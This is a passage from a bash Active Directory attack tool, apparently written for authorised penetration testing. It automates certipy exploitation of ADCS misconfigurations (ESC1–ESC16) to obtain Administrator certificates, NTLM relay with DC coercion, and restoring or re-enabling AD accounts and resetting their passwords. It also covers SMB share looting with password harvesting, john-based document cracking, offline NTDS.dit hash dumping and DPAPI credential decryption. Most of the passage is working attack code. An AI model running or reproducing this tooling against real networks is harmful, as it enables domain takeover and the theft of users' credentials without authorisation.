    local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" \
                 "${sidargs[@]}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" "$@")
    run "certipy ${rargs[*]}"
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
    _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "$label"
}

# ESC3 — Enrollment Agent: get an agent cert, then request On-Behalf-Of Administrator.
_adcs_esc3() {
    local ca="$1" agenttpl="$2"; _adcs_setauth
    confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
    local agent; agent=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | grep -vi administrator | head -1)
    [[ -z "$agent" ]] && { warn "  ESC3: no enrollment-agent PFX produced"; return 1; }
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
        -on-behalf-of "${DOMAIN%%.*}\\administrator" -pfx "$(basename "$agent")" \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
    _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "ESC3"
}
# ESC4 — writable template ACL: push an ESC1-vulnerable config, exploit, then restore.
_adcs_esc4() {
    local ca="$1" tpl="$2"; _adcs_setauth
    confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
        -write-default-configuration -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
    rb_record "ESC4: overwrote template $tpl config" \
              "certipy template -template '$tpl' -configuration '$OUTDIR/${tpl}.json' -dc-ip '$DC_IP'  # restore saved config"
    _adcs_req_admin "$ca" "$tpl" "ESC4" 1; local rc=$?
    # restore the original template configuration (best-effort)
    [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy template "${_ADCS_AUTH[@]}" \
        -template "$tpl" -configuration "${tpl}.json" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    return $rc
}
# ESC7 — ManageCA/ManageCertificates: enable SubCA, request (pending), self-issue, retrieve.
_adcs_esc7() {
    local ca="$1"; _adcs_setauth
    confirm "  ESC7: add self as CA officer, enable SubCA, issue a request as Administrator?" || return 1
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    rb_record "ESC7: added $USER as officer on CA $ca" "certipy ca -ca '$ca' -remove-officer '$USER' -dc-ip '$DC_IP'"
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
        -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
    local rid; rid=$(grep -oiP 'request ID is\s*\K[0-9]+' <<<"$out" | head -1)
    [[ -z "$rid" ]] && { _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"; return $?; }
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
    _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"
}
# ESC13 — issuance policy linked to a group: enrol, auth → TGT carries that group.
_adcs_esc13() {
    local ca="$1" tpl="$2"; _adcs_setauth
    confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
    local pfx; pfx=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
    _adcs_pwn_pfx "$pfx" "ESC13" "$USER"   # self hash/TGT, now with the linked group in its PAC
}
# ESC8 / ESC11 — relay to web/RPC enrollment. Needs a listener + coercion to US;
# best-effort and time-boxed (truly interactive, may need your own setup).
_adcs_relay() {
    local esc="$1" lhost; lhost=$(ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1)
    warn "  ${esc}: relay is interactive (listener + coercion). Attempting a time-boxed auto-relay…"
    have certipy || return 1
    local tgt="http://${DC_FQDN:-$DCT}/certsrv/certfnsh.asp"
    run "certipy relay -target $tgt -template DomainController  (60s) + coerce DC→$lhost"
    ( cd "$OUTDIR" && timeout 60 certipy relay -target "$tgt" -template DomainController 2>&1 | tee -a "$LOGFILE" ) &
    local rpid=$!
    sleep 3
    $NXC smb "$DCT" $(nxc_cred_args | tr '\n' ' ') -M coerce_plus -o LISTENER="$lhost" 2>&1 | tail -5 | tee -a "$LOGFILE"
    wait "$rpid" 2>/dev/null
    local pfx; pfx=$(ls -t "$OUTDIR"/*dc*.pfx "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
    [[ -n "$pfx" ]] && { _adcs_pwn_pfx "$pfx" "$esc" "$DC_HOST\$"; return $?; }
    warn "  ${esc}: no cert captured — run the relay+coercion manually with your listener"; return 1
}

_abuse_adcs() {
    local cout="$1"
    have certipy || return 1
    local ca; ca=$(grep -ioP 'CA Name\s*:\s*\K\S+' <<<"$cout" | head -1)
    # Only the ESC(s) certipy actually flagged on THIS CA — we don't sweep 1..16,
    # we exploit exactly what's present (one, or several), and stop the moment one
    # lands Administrator.
    local escs; escs=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | tr 'a-z' 'A-Z' | sort -u -V)
    [[ -z "$escs" ]] && return 1
    loot "ADCS vulnerabilities identified: $(echo "$escs" | paste -sd' ' -)"
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to auto-exploit the flagged ESC(s) and pivot to Administrator)"; return 1; }
    [[ -z "$ca" ]] && { warn "Could not parse CA name — exploit ADCS manually (see certipy_find.txt)"; return 1; }

    _ADCS_SID="$(_adcs_admin_sid)"      # for strong-mapping (-sid); empty is fine
    local esc tpl
    for esc in $escs; do                # $escs = the flagged ones only, not a 1..16 sweep
        tpl=$(_adcs_template_for "$cout" "$esc"); [[ -z "$tpl" ]] && tpl="User"
        case "$esc" in
            ESC1|ESC2|ESC6)  _adcs_req_admin "$ca" "$tpl" "$esc" 1 && return 0 ;;   # SAN impersonation (+SID)
            ESC9|ESC10|ESC16) _adcs_req_admin "$ca" "$tpl" "$esc" 0 && return 0 ;;  # missing SID extension → UPN map
            ESC15) [[ "$tpl" == "User" ]] && tpl="WebServer"
                   _adcs_req_admin "$ca" "$tpl" "ESC15" 1 -application-policies 'Client Authentication' && return 0 ;;
            ESC3)  _adcs_esc3  "$ca" "$tpl" && return 0 ;;
            ESC4)  _adcs_esc4  "$ca" "$tpl" && return 0 ;;
            ESC7)  _adcs_esc7  "$ca"        && return 0 ;;
            ESC13) _adcs_esc13 "$ca" "$tpl" && return 0 ;;
            ESC8|ESC11) _adcs_relay "$esc"  && return 0 ;;
            ESC5)  warn "  ESC5 (vulnerable PKI object ACL) → review the writable PKI object in certipy_find.txt (e.g. take over the CA host / NTAuthCertificates)" ;;
            ESC14) warn "  ESC14 (weak explicit mapping) → write altSecurityIdentities on a privileged target to your cert (needs that write right)" ;;
            *) warn "  $esc detected — see certipy_find.txt" ;;
        esac
    done
    warn "ADCS auto-exploit didn't reach Administrator — review certipy_find.txt"
    return 1
}

# ===========================================================================
#  DELETED & DISABLED ACCOUNTS  —  detect, and (with --abuse) restore/enable
#  Chain: restore a deleted user → re-enable it → a leaked password now works.
# ===========================================================================
phase_recycle_disabled() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
    have bloodyAD || return
    section "ACCOUNT LIFECYCLE · DISABLED · DELETED · PASSWORD-RESET"
    local ba; mapfile -t ba < <(bloody_args)
    local changed=0

    subsection "Disabled accounts (re-enable + a known password = access)"
    local dis
    dis=$(bloodyAD "${ba[@]}" get search \
            --filter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
            --attr sAMAccountName 2>/dev/null | grep -oiP 'sAMAccountName:\s*\K\S+' | grep -viE '^(krbtgt|guest)$')
    if [[ -n "$dis" ]]; then
        echo "$dis" | while read -r u; do echo -e "      ${C_YELLOW}· $u (disabled)${C_RESET}"; done
        echo "$dis" >"$OUTDIR/disabled_accounts.txt"
        if [[ "$DO_ABUSE" == "1" ]]; then
            echo "$dis" | while read -r u; do
                confirm "  Re-enable disabled account '$u'?" || continue
                if bloodyAD "${ba[@]}" remove uac "$u" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|removed|modif'; then
                    loot "★ Re-enabled '$u' → added to spray pool"
                    rb_record "Re-enabled account $u" "bloodyAD ${ba[*]} add uac '$u' -f ACCOUNTDISABLE"
                    echo "$u" >>"$OUTDIR/users_all.txt"; changed=1
                fi
            done
        else
            info "  (report-only; --abuse to re-enable and spray them)"
        fi
    else
        info "No disabled user accounts found"
    fi

    subsection "Accounts that must change password at next logon (pwdLastSet=0)"
    # An admin set a temporary password and the user never logged in. If we hold
    # ForceChangePassword over them (see ACL phase) or know that temp password,
    # it's an easy takeover. Surface them as priority targets.
    local mustchg
    mustchg=$(bloodyAD "${ba[@]}" get search \
            --filter '(&(objectCategory=person)(objectClass=user)(pwdLastSet=0)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
            --attr sAMAccountName 2>/dev/null | grep -oiP 'sAMAccountName:\s*\K\S+' | grep -viE '^(krbtgt|guest)$')
    if [[ -n "$mustchg" ]]; then
        echo "$mustchg" | while read -r u; do echo -e "      ${C_MAGENTA}· $u (password reset pending — temp password set)${C_RESET}"; done
        echo "$mustchg" >"$OUTDIR/must_change_password.txt"
        loot "Accounts pending password change — prime targets for ForceChangePassword / temp-password reuse"
    else
        info "No accounts pending a password change"
    fi

    subsection "Deleted objects (AD Recycle Bin)"
    local del
    # Tombstoned/deleted/recycled objects need BOTH show-recycled (…2064) and
    # show-deactivated-link (…2065) controls together — passing only one returns
    # nothing even when you hold restore rights (this is general, not lab-specific).
    del=$(bloodyAD "${ba[@]}" get search --filter '(isDeleted=TRUE)' \
            --attr sAMAccountName,distinguishedName,lastKnownParent \
            -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 2>&1)
    if echo "$del" | grep -qiE 'noSuchObject|denied|ERROR|Traceback'; then
        info "Deleted objects not accessible with this identity (need rights / Recycle Bin)"
    elif echo "$del" | grep -qi 'distinguishedName'; then
        echo "$del" | grep -oiP 'distinguishedName:\s*\K.*DEL:[^,]+.*' | while read -r dn; do
            echo -e "      ${C_MAGENTA}· $dn${C_RESET}"; done
        echo "$del" >"$OUTDIR/deleted_objects.txt"
        loot "Deleted objects present — restorable if you hold the rights"
        if [[ "$DO_ABUSE" == "1" ]]; then
            # Pair each tombstoned object's DN with its sAMAccountName (restore by
            # DN, but enable + spray by the *account name*, not the CN).
            while IFS=$'\t' read -r dn sam; do
                [[ -z "$dn" ]] && continue
                local name="${sam:-$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')}"
                confirm "  Restore deleted account '$name'?" || continue
                if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
                    loot "★ Restored '$name' — re-enabling & taking it over"
                    rb_record "Restored deleted object $name" "echo 'Manual: re-delete $name if required by client'"
                    bloodyAD "${ba[@]}" remove uac "$sam" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" >/dev/null
                    [[ -n "$sam" ]] && { echo "$sam" >>"$OUTDIR/users_all.txt"; changed=1; }
                    # We usually hold rights over the restored object (e.g. GenericAll
                    # on its parent OU) → reset its password and pivot to it directly,
                    # instead of hoping a leaked password still works. This is the
                    # the classic OU-GenericAll → restore-deleted-user → reset chain.
                    if [[ -n "$sam" ]] && bloodyAD "${ba[@]}" set password "$sam" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed'; then
                        loot "★ Reset restored account '${sam}' → pivoting as it"
                        note_cred_source "$sam" "AD Recycle Bin restore + password reset"
                        rb_record "Reset password of restored $sam (ORIGINAL UNKNOWN)" "echo 'Manual: coordinate password restore for $sam'"
                        queue_cred "$sam" "$PIVOT_PW" ""
                    fi
                fi
            done < <(echo "$del" | awk '
                /^distinguishedName:/{dn=$0; sub(/^distinguishedName:[ ]*/,"",dn)}
                /^sAMAccountName:/{sam=$0; sub(/^sAMAccountName:[ ]*/,"",sam)}
                /^[[:space:]]*$/{ if(dn ~ /DEL:/ && sam!="") print dn"\t"sam; dn="";sam="" }
                END{ if(dn ~ /DEL:/ && sam!="") print dn"\t"sam }')
        else
            info "  (report-only; --abuse to restore them)"
        fi
    else
        info "No deleted objects found"
    fi
    [[ "$changed" == "1" ]] && sort -u -o "$OUTDIR/users_all.txt" "$OUTDIR/users_all.txt"
}

# ===========================================================================
#  CLEANUP  —  revert every change this tool made (responsible teardown)
# ===========================================================================
run_cleanup() {
    section "CLEANUP · REVERTING TOOL-MADE CHANGES"
    if [[ ! -s "$ROLLBACK_FILE" ]]; then
        ok "No tracked changes to revert — nothing to clean up"
        return
    fi
    warn "The following changes were made and will be reverted:"
    grep '^### ' "$ROLLBACK_FILE" | sed 's/^### /      - /'
    confirm "Proceed with rollback?" || { info "Cleanup aborted by operator"; return; }
    # Execute every non-comment line as an undo command
    grep -v '^### ' "$ROLLBACK_FILE" | while IFS= read -r cmd; do
        [[ -z "$cmd" ]] && continue
        run "$cmd"; eval "$cmd" 2>&1 | tee -a "$LOGFILE"
    done
    ok "Rollback complete. Reminder: this tool never touched event logs — confirm log integrity with the client."
}

# ===========================================================================
#  SHARE LOOTING  —  spider readable shares, pull & process interesting files
# ===========================================================================
# Extract a crackable hash from a password-protected file and crack it.
crack_file() {
    local f="$1" base ext tool
    base="$(basename "$f")"; ext="${base##*.}"; ext="${ext,,}"
    # Already cracked/attempted this doc in a previous pivot pass → don't redo it
    # (the recovered password is already in FOUND_SECRETS). Saves re-running john.
    [[ -n "${CRACKED_DOCS[$base]:-}" ]] && return
    case "$ext" in
        xls|xlsx|xlsm|doc|docx|ppt|pptx) tool=office2john ;;
        pdf)  tool=pdf2john ;;
        zip)  tool=zip2john ;;
        rar)  tool=rar2john ;;
        7z)   tool=7z2john ;;
        kdbx) tool=keepass2john ;;
        *) case "$base" in id_rsa|*.ppk|*.pem|*.key) tool=ssh2john ;; *) return ;; esac ;;
    esac
    have "$tool" || { warn "$tool not installed — cannot process $base"; return; }
    local hashf="$OUTDIR/filehash_${base}.txt"
    "$tool" "$f" 2>/dev/null >"$hashf"
    [[ ! -s "$hashf" ]] && { rm -f "$hashf"; return; }
    CRACKED_DOCS["$base"]=1     # mark attempted now → future passes skip it
    loot "Crackable hash extracted from ${C_BOLD}${base}${C_RESET} → cracking with john…"
    run "john --wordlist=$WORDLIST $hashf"
    john --wordlist="$WORDLIST" "$hashf" >/dev/null 2>&1
    local show pw
    show=$(john --show "$hashf" 2>/dev/null | grep -vE 'password hash|^$' | head -1)
    pw=$(echo "$show" | cut -d: -f2)
    if [[ -n "$pw" ]]; then
        loot "★ File password cracked → ${base} : ${C_GREEN}${C_BOLD}${pw}${C_RESET}"
        echo "${base}:${pw}" >>"$OUTDIR/cracked_files.txt"
        add_secret "$pw" "doc password: $base"
        decrypt_and_read "$f" "$pw" "$ext"
    else
        info "Could not crack ${base} with this wordlist"
    fi
}

# Decrypt an office/zip file with the cracked password and harvest its contents
decrypt_and_read() {
    local f="$1" pw="$2" ext="$3" base; base="$(basename "$f")"
    local dec="$OUTDIR/decrypted_${base}"
    case "$ext" in
        xls|xlsx|xlsm|doc|docx|ppt|pptx)
            if have msoffcrypto-tool; then
                msoffcrypto-tool "$f" "$dec" -p "$pw" 2>/dev/null \
                    && ok "Decrypted → decrypted_${base}" || { warn "msoffcrypto-tool could not decrypt"; return; }
            else
                warn "msoffcrypto-tool not installed → cannot auto-decrypt (install: pipx install msoffcrypto-tool)"; return
            fi ;;
        zip) mkdir -p "${dec}.d"; unzip -P "$pw" -o "$f" -d "${dec}.d" >/dev/null 2>&1 && dec="${dec}.d" ;;
        *) return ;;
    esac
    subsection "Reading decrypted contents of ${base} for credentials"
    # Extract ONLY human-readable cell/paragraph text (not the file's XML internals)
    local txt=""
    case "$ext" in
        xlsx|xlsm) txt=$(unzip -p "$dec" 'xl/sharedStrings.xml' 2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        docx)      txt=$(unzip -p "$dec" 'word/document.xml'     2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        pptx)      txt=$(unzip -p "$dec" 'ppt/slides/slide*.xml' 2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        *)         [[ -d "$dec" ]] && txt=$(find "$dec" -type f -exec cat {} + 2>/dev/null) || txt=$(strings -n 4 "$dec" 2>/dev/null) ;;
    esac
    printf '%s\n' "$txt" | grep -vE '^\s*$' | sort -u | tee "$OUTDIR/content_${base}.txt" | head -40
    harvest_secrets <<<"$txt" "$base"
}

# Pull likely passwords out of free text and feed them to the engine.
# Strategy: (1) keyword-anchored secrets (high confidence), (2) a few standalone
# strong tokens (upper+lower+digit, len>=8). Junk (paths/xml) is filtered out.
# Reject things that look harvested but aren't passwords: GUIDs, hex/0x literals,
# pure numbers, and long base64/hex blobs (keys, not creds). Keeps real ones
# like football1 / M1XyC9pW7qT5Vn while dropping {GUID}, 0x01C0…, base64 keys.
_plausible_secret() {
    # NOTE: keep these on separate lines. `local s="$1" n=${#s}` expands ${#s}
    # against the CALLER's `s` (dynamic scope), not the one just assigned — so n
    # would be wrong (0, or the caller's length) unless the caller happens to use
    # a var named `s`. That silently broke DPAPI ingestion (caller var was `p`).
    local s="$1"; local n=${#s}
    (( n < 6 || n > 40 )) && return 1
    [[ "$s" =~ ^\{?[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\}?$ ]] && return 1   # GUID
    [[ "$s" =~ ^0[xX][0-9a-fA-F]+$ ]] && return 1                                          # hex literal
    [[ "$s" =~ ^[0-9a-fA-F]{16,}$ ]] && return 1                                           # long pure hex
    [[ "$s" =~ ^[0-9]+$ ]] && return 1                                                     # pure number
    # long token with NO special char and NOT clearly a passphrase → likely a key/blob
    (( n > 26 )) && [[ ! "$s" =~ [^A-Za-z0-9] ]] && return 1
    return 0
}

harvest_secrets() {
    local label="${1:-text}" text; text=$(cat)
    local -a hits=()
    # (1) "password/pwd/reset to/set to/secret : X"  →  X
    while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
        printf '%s\n' "$text" | grep -oiP '(password|passwd|pwd|pass(?:word)?|reset to|set to|secret|creds?)\s*(?:is|was|to|[:=])?\s*\K[A-Za-z0-9!@#$%^&*._-]{6,40}' )
    # (2) standalone strong tokens (capped to avoid lockout-spray noise)
    while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
        printf '%s\n' "$text" | grep -oP '\b(?=[A-Za-z0-9!@#$%^&*._-]*[A-Z])(?=[A-Za-z0-9!@#$%^&*._-]*[a-z])(?=[A-Za-z0-9!@#$%^&*._-]*[0-9])[A-Za-z0-9!@#$%^&*._-]{8,40}\b' | sort -u | head -8 )
    local added=0 s
    for s in "${hits[@]}"; do
        # filter obvious non-secrets
        [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
        [[ "$s" == */* || "$s" =~ \.(xml|bin|rels|png|jpg|csv|ini|inf|pol)$ ]] && continue
        _plausible_secret "$s" || continue          # drop GUIDs, hex, blobs, fragments
        if [[ -z "${FOUND_SECRETS[$s]:-}" ]]; then
            loot "Potential password harvested from ${label}: ${C_GREEN}${C_BOLD}$s${C_RESET}"
            add_secret "$s" "harvested from $label"; added=$((added+1))
        fi
    done
    [[ "$added" == "0" ]] && info "No clear passwords harvested from ${label}"
}

# Process NTDS.dit + SYSTEM hive offline to recover all domain hashes
phase_ntds_local() {
    local ntds="$1" system="$2"
    have impacket-secretsdump || return
    subsection "Offline NTDS extraction (secretsdump LOCAL)"
    run "impacket-secretsdump -ntds $ntds -system $system LOCAL"
    impacket-secretsdump -ntds "$ntds" -system "$system" LOCAL -outputfile "$OUTDIR/ntds_local" 2>&1 \
        | tee -a "$LOGFILE" | tee "$OUTDIR/ntds_local.txt"
    if grep -qE ':::' "$OUTDIR/ntds_local.txt" 2>/dev/null; then
        loot "★★★★★ NTDS DUMPED OFFLINE — domain NTLM hashes recovered"
        grep -E ':::' "$OUTDIR/ntds_local.txt" | while read -r line; do
            local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
            echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
        done
        while read -r l; do
            local h; h=$(echo "$l" | cut -d: -f4)
            loot "ADMINISTRATOR hash: $h"; queue_cred "Administrator" "" "$h"
        done < <(grep -iE '^administrator:' "$OUTDIR/ntds_local.txt" | head -1)
        [[ "$DO_CRACK" == "1" ]] && {
            grep -E ':::' "$OUTDIR/ntds_local.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntds_ntlm.txt"
            crack_hashes "$OUTDIR/ntds_ntlm.txt" 1000 "NTLM"; }
    fi
}

phase_share_loot() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
    section "SHARE LOOTING · INTERESTING FILES"
    local args; mapfile -t args < <(nxc_cred_args)
    local dl="$OUTDIR/shares"; mkdir -p "$dl"

    # Only pull INTERESTING files. Without filters the spider drags down whole
    # roaming/user profiles (browser caches, search indexes, registry tx logs,
    # thumbnails…) — hundreds of junk files that bury real loot and flood the
    # password harvester with garbage tokens. spider_plus is exclude-based, so we
    # strip known-noise extensions and folder/name substrings. DPAPI material is
    # explicitly preserved: masterkeys (GUID, no ext), Credentials (hex, no ext)
    # and Vault (.vpol/.vcrd) match no exclusion below, and the Protect/
    # Credentials/Vault folders aren't filtered → offline DPAPI still gets fed.
    # NOTE: EXCLUDE_FILTER substrings must be space-free (nxc -o is space-split).
    local skip_exts="ico,lnk,db,db-wal,db-shm,ldb,log,dat,tmp,blf,regtrans-ms,pma,chk,etl,evtx,jfm,mui,cat,manifest,sqlite,sqlite-wal,sqlite-shm,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,sst,cdp,search-ms,url,theme,thmx,automaticdestinations-ms,customdestinations-ms"
    local skip_dirs="ipc\$,Cache,Crashpad,BrowserMetrics,Packages,ConnectedDevicesPlatform,PenWorkspace,Temp,Edge,Chromium,Mozilla,GPUCache,History,Cookies"
    subsection "Spidering readable shares → interesting files only (≤5MB)"
    run "$NXC smb $DCT ${args[*]} -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 EXCLUDE_EXTS=$skip_exts EXCLUDE_FILTER=$skip_dirs OUTPUT_FOLDER=$dl"
    $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
        EXCLUDE_EXTS="$skip_exts" EXCLUDE_FILTER="$skip_dirs" OUTPUT_FOLDER="$dl" 2>&1 \
        | tail -25 | tee -a "$LOGFILE"

    local files; files=$(find "$dl" -type f 2>/dev/null)
    [[ -z "$files" ]] && { info "No files downloaded from shares"; return; }
    loot "$(echo "$files" | wc -l) files pulled from shares → $dl"

    subsection "Hunting credentials inside downloaded files"
    grep -rEisn 'password|passwd|pwd=|connectionstring|secret|api[_-]?key|cpassword' "$dl" 2>/dev/null \
        | grep -vEi '\.(dll|exe|png|jpg)' | head -40 | tee "$OUTDIR/share_secrets.txt"
    [[ -s "$OUTDIR/share_secrets.txt" ]] && loot "Potential secrets in files → share_secrets.txt"
    # Harvest passwords from small text/config files and feed the engine.
    # Skip: SYSVOL/GPO policy trees (GUIDs/registry hex), per-user AppData
    # profiles (browser/app junk → garbage tokens that flood the spray) and
    # desktop.ini stubs. Real share docs (IT/HR/Finance/etc.) are kept.
    find "$dl" -type f -size -200k \
        -not -ipath '*/sysvol/*' -not -ipath '*/policies/*' -not -ipath '*/AppData/*' \
        -not -iname 'desktop.ini' \
        \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
        -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \) \
        -exec cat {} + 2>/dev/null | harvest_secrets "shares"

    subsection "Cracking password-protected documents found on shares"
    while IFS= read -r f; do
        case "${f,,}" in
            *.xls|*.xlsx|*.xlsm|*.doc|*.docx|*.ppt|*.pptx|*.pdf|*.zip|*.rar|*.7z|*.kdbx) crack_file "$f" ;;
            *id_rsa|*.ppk|*.pem|*.key) loot "Private/SSH key found: $f"; echo "$f" >>"$OUTDIR/ssh_keys.txt" ;;
        esac
    done <<<"$files"

    # NTDS + SYSTEM backups → recover everything offline
    local ntds system
    ntds=$(echo "$files"   | grep -iE 'ntds\.dit$' | head -1)
    system=$(echo "$files" | grep -iE '(/|_|\.)SYSTEM(\.(hiv|bak|save|old))?$' | head -1)
    if [[ -n "$ntds" && -n "$system" ]]; then
        loot "★★★ NTDS.dit + SYSTEM hive found in shares!"
        phase_ntds_local "$ntds" "$system"
    fi

    # DPAPI material looted from shares → try to decrypt it offline, automatically
    # here-string, NOT `echo "$files" | grep -q`: under `set -o pipefail`, grep -q
    # matches early and exits, echo dies on SIGPIPE, and the pipeline reports
    # failure even though there WAS a match → the block would be skipped (this is
    # exactly why offline DPAPI silently never ran once the spider pulled enough
    # files for grep to short-circuit before echo finished writing).
    if grep -qiE 'Protect/|Credentials|Vault|masterkey' <<<"$files"; then
        phase_dpapi_offline "$dl"
    fi
}

# ===========================================================================
#  DPAPI OFFLINE  —  decrypt masterkeys + credential/vault blobs looted from
#  shares, using any plaintext password we've recovered. Fully generic: it keys
#  off the standard Windows DPAPI layout (Protect/<SID>/<GUID> masterkeys,
#  Credentials/* and Vault/* blobs), not any specific account.
# ===========================================================================
phase_dpapi_offline() {
    local dl="$1"
    have impacket-dpapi || { warn "impacket-dpapi unavailable — skipping offline DPAPI"; return; }
    [[ ${#FOUND_SECRETS[@]} -eq 0 ]] && return     # need at least one plaintext to try

    local mks creds
    mks=$(find "$dl" -type f -ipath '*protect*' -regextype posix-extended \
            -iregex '.*/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' 2>/dev/null)
    creds=$(find "$dl" -type f \( -ipath '*credentials*' -o -ipath '*vault*' \) ! -iname '*.pol' 2>/dev/null)
    [[ -z "$mks" && -z "$creds" ]] && return

    section "DPAPI · OFFLINE DECRYPTION OF LOOTED BLOBS"
    local -A MKEYS=()        # decrypted masterkey GUID -> hex key
    local mk sid pw out k

    subsection "Decrypting masterkeys with recovered passwords"
    while IFS= read -r mk; do
        [[ -z "$mk" ]] && continue
        sid=$(printf '%s' "$mk" | grep -oiP 'S-1-5-21-[0-9-]+' | head -1)
        [[ -z "$sid" ]] && continue
        for pw in "${!FOUND_SECRETS[@]}"; do
            out=$(impacket-dpapi masterkey -file "$mk" -sid "$sid" -password "$pw" 2>/dev/null)
            k=$(printf '%s' "$out" | grep -oiP 'Decrypted key with User Key.*0x\K[0-9a-f]+|Decrypted key:\s*0x\K[0-9a-f]+' | head -1)
            if [[ -n "$k" ]]; then
                MKEYS["$(basename "$mk")"]="$k"
                loot "★ DPAPI masterkey $(basename "$mk") decrypted (password of SID ${sid})"
                break
            fi
        done
    done <<<"$mks"

    [[ ${#MKEYS[@]} -eq 0 ]] && { info "No DPAPI masterkey could be decrypted with the known passwords"; return; }

    # Pull a (user,password) out of any decrypted DPAPI output and pivot on it
    _dpapi_ingest() {
        local o="$1" src="$2" u p
        u=$(printf '%s' "$o" | grep -oiP 'Username\s*:\s*\K.+'        | head -1 | sed 's#.*\\##' | tr -d '\r ')
        p=$(printf '%s' "$o" | grep -oiP 'Password\s*:\s*\K\S.*'      | head -1 | tr -d '\r')
        [[ -z "$p" ]] && p=$(printf '%s' "$o" | grep -oiP 'Unknown\s*:\s*\K\S.*' | tail -1 | tr -d '\r')
